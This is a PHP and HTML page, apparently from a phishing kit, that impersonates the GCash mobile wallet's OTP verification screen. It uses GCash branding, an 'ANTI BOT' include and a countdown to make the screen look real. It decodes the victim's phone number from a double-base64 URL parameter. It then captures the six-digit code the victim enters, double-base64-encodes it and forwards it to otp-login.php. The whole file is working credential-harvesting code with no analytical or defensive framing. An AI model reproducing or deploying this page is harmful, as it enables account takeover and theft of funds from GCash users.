<?php
// ANTI BOT
include('../src/system.php');
if(isset($_GET['otpclid'])){
    $num = base64_decode(base64_decode($_GET['otpclid']));
} else{
  header("Location:index.php");
}

?>

<!DOCTYPE html>
<html>
<head>
  <title>GCash-OTP-Code</title>
  <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
  <link rel="shortcut icon" href="https://img.appsrankings.com/520020791/gcash-logo.jpg" type="image/x-icon" />
<link rel="preconnect" href="https://fonts.gstatic.com">
<link rel="stylesheet/less" type="text/css" href="gcash_css/style.css" />
<link href="https://fonts.googleapis.com/css?family=Karla|Karla:Bold|Poppins|Poppins:600&amp;display=swap" rel="stylesheet">
<script src="https://code.jquery.com/jquery-1.9.1.min.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>

body {
color:light-gray;
margin:0;
padding:0;
font-family: Karla,sans-serif;
text-align:center;
-webkit-touch-callout: none;
    -webkit-user-select: none;
     -khtml-user-select: none;
       -moz-user-select: none;
        -ms-user-select: none;
            user-select: none;
}
      
      .otpBox{
          width:250px;
          margin:0 
          auto;margin-top: 20px;
          padding: 10px;
          border-radius:3px;
          background: white;
          margin-bottom:10px;
          height: 70px;
      }
      #otpdisable {
background-color:#0079FC;
border: none;
margin:5px;
padding:11px;
cursor:pointer;
color: white;
text-align: center;
font-size:16px;
outline:none;
border-radius: 35px;
width:280px;
}

#otpdisable:disabled {
background-color:#9fcbff;;
border: none;
margin:5px;
padding:11px;
color: white;
text-align: center;
font-size:16px;
outline:none;
border-radius: 35px;
width:280px;
}

.otp_img{
    content: url(../Gcash_files/otp-gcash-new.png);
    margin-top:10px;
    width:100px;
    height:115px;
    margin-left: auto;
    margin-right: auto
}
  </style>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.5.3/angular.min.js"></script>
  <script>

function isNumber(evt) {
  evt = (evt) ? evt : window.event;
  var charCode = (evt.which) ? evt.which : evt.keyCode;
  if (charCode > 31 && (charCode < 48 || charCode > 57)) {
    return false;
  }
  return true;
   }

angular.module("otpInputDirective",[]).directive("otpInputDirective",["$timeout",function(o){
    return{
        restrict:"A",
        scope:{
            options:"="},
            template:"<div> <input autofocus=\"autofocus\" type='{{type}}' onkeypress=\"return isNumber(event)\" ng-repeat=\"c in characters\" autocomplete='off' ng-keyup='onKeyUp($index,$event)' ng-keydown='onKeyDown($index,$event)' ng-model='c.value' id='otpInput{{c.index}}' name='otpInput{{c.index}}' ng-style=\"style\" placeholder=\"{{placeholder}}\" maxlength=\"1\"  />\n</div>",link:function(e,n){var t=parseInt(e.options.size)||6,i=100/(t+1),p=i/t,l=[],a=[],r="light-gray",s=Math.floor(1e4*Math.random())+100;e.style={"margin-right":p+"%",
                border:"none","border-bottom":"thin solid #bdbdd2","border-radius":"0",
                display:"inline-block",
                width:i+"%","text-align":"center","margin-top":"5px",
                padding:"3px 0px",
                outline:"none","box-shadow":"none",
                background:"transparent","border-color":e.options.style&&e.options.style.lineColor?e.options.style.lineColor:r,
                color:e.options.style&&e.options.style.color?e.options.style.color:r,"font-size":e.options.style&&e.options.style.fontSize?scope.options.style.fontSize:"25px"},e.type=e.options.type?e.options.type:"text",e.placeholder=e.options.placeholder&&1===e.options.placeholder.length?e.options.placeholder:"",e.setOtpValue=function(){e.options.value="";var o=!0;angular.forEach(e.characters,function(n,t){if(1!==n.value.length)return o=!1,!1;e.options.value=e.options.value+n.value}),o&&"function"==typeof e.options.onDone&&e.options.onDone(e.options.value)},e.onKeyUp=function(n,i){var p=i.keyCode||i.which,l=e.options.value;e.setOtpValue(),e.characters[n].value.length>0&&8!==p&&n!=t-1&&o(
                    function(){a[n+1][0].focus()}),"function"==typeof e.options.onChange&&l!==e.options.value&&e.options.onChange(e.options.value)},e.onKeyDown=function(n,t){8===(t.keyCode||t.which)&&""===e.characters[n].value&&0!==n&&o(function(){a[n-1][0].focus()})};for(var c=0;c<t;c++)l.push({index:s+"-"+c,value:""});e.characters=l,o(function(){for(var o=0;o<t;o++)a.push(angular.element(document.querySelector("#otpInput"+s+"-"+o)))})}
            }}]);
      </script>

<script>


function createCookie(name, value, days) {
    var expires;
      
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toGMTString();
    }
    else {
        expires = "";
    }
      
    document.cookie = escape(name) + "=" + 
        escape(value) + expires + "; path=/";
}
</script>
  <script>
    'use strict';
     var app = angular.module('exampleApp', ["otpInputDirective"]);
      app.controller('appCtrl',function($scope) {
        $scope.otpInput={
            size:6,
            type:"tel",
            onDone: function(value){
              
                var encodeb64 = btoa(btoa(value));

                if(value.length == "6"){
                    
                    document.getElementById("otpdisable").onclick = function(){
                        window.location.href="otp-login.php?mpin="+encodeb64+"&otpclid=<?php echo $num;?>";
                    }
                  
                }
               
            },
            onChange: function(value){
                
                var l = value.length;
                if(l == "6"){
                   document.getElementById("otpdisable").disabled = false;
               }
                else{
                   document.getElementById("otpdisable").disabled = true;
              }
                
            }
        }
      });

  </script>
 </head>

 <?php
$number_encode = $_GET['otpclid'];
$num = base64_decode(base64_decode($number_encode));
?>
 <body ng-app="exampleApp" ng-controller="appCtrl">
 <br><center>
 <div style="background: white;border-radius: 8px; padding: 40px 20px; border: thin solid #dadce0;height: 500px;width: 350px;" >
 <div class="otp_img"></div><br>

<span style="font-size:16px;">Great! We sent a 6-digit <br>authentication code to <br>your number.
</span>
<span style="font-size:16px;">0<?php echo $num;?></span>
    <div id="countdown"></div>
<script>
   var timeLeft = 200;
    var elem = document.getElementById('countdown');
    var timerId = setInterval(countdown, 1000);
    function countdown() {
      if (timeLeft == -1) {
        clearTimeout(timerId);
        doSomething();
      } else {
        elem.innerHTML = ' <br><span>Resend OTP in <b>'+timeLeft+ 's</span>';
        timeLeft--;
      }
      if (timeLeft == "0"){
           window.location.reload(true);
      }
    }
</script>
    
  <div class="otpBox">
  
    <div otp-input-directive options="otpInput"></div><br>
    </div>
    <span style="font-size:14px;">Enter Authentication Code</span>

    <br>   <br>

    <?php
echo "
<span>Need new code? 
<span style='color:#0079FC;font-size:16px;'><a style='text-decoration:none;' id='myHref'>Resend now</a></span></span>
<script>


$('#myHref').on('click', function() {
  window.location = 'otpresend.php?otpclid=".$number_encode."&otpresend=9fed15500455f3fc177ef823fa53ae4f';
});</script>";


?>
<br><br>
<input type="submit" name="submitotp" id="otpdisable" value="submit" disabled>
</div></center>
 <body>
 </html>